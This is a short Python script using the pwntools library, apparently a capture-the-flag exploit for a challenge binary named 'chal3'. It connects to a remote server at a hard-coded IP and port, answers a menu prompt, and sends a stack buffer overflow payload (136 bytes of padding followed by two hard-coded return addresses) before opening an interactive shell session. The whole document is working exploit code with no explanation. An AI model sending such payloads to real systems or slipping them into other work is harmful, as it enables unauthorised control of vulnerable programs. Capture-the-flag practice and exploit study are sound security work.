from pwn import *
p=process('./chal3')
p=remote('23.146.248.136', 31579)
p.sendline(b'1')
p.sendline(b'shibaaa')
payload=b'a'*136+p64(0x000000000040101a)+p64(0x40135e)
p.sendline(payload)
p.interactive()
